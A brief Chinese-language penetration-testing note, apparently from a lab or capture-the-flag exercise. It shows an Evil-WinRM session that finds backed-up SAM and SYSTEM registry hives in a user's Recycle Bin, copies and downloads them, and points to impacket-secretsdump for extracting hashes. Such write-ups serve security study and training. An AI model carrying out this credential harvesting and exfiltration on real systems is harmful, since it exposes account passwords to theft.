# $Recycle.Bin

### 用 jaws-enum.ps1 找到 $Recycle.Bin

### 檢視裡面的路徑& SID
```bash
*Evil-WinRM* PS C:\> gci -path 'C:\$Recycle.Bin' -h


    Directory: C:\$Recycle.Bin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        9/18/2020   7:28 PM                S-1-5-21-1987495829-1628902820-919763334-1001
d--hs-       11/13/2020  10:41 PM                S-1-5-21-1987495829-1628902820-919763334-500


*Evil-WinRM* PS C:\> Get-LocalUser -Name $env:USERNAME | Select sid

SID
---
S-1-5-21-1987495829-1628902820-919763334-1001


*Evil-WinRM* PS C:\> 
```

### 找 SID 的資料
```bash
*Evil-WinRM* PS C:\> gci -force '$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001'


    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        9/18/2020   2:14 AM            129 desktop.ini
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak


*Evil-WinRM* PS C:\> 
```

### 發現 `.bak` 並下載
```bash
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/31/2025   7:03 AM          16974 jaws.ps1


*Evil-WinRM* PS C:\temp> copy 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\sam.bak' 'C:\temp'
*Evil-WinRM* PS C:\temp> copy 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak' 'C:\temp'
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/31/2025   7:03 AM          16974 jaws.ps1
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak


*Evil-WinRM* PS C:\temp> download sam.bak
                                        
Info: Downloading C:\temp\sam.bak to sam.bak
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.bak
                                        
Info: Downloading C:\temp\system.bak to system.bak
Progress: 6% : |▒░░░░░░░░░░|          

                                        
Info: Download successful!       
```

可用 impacket-secretsdump 解密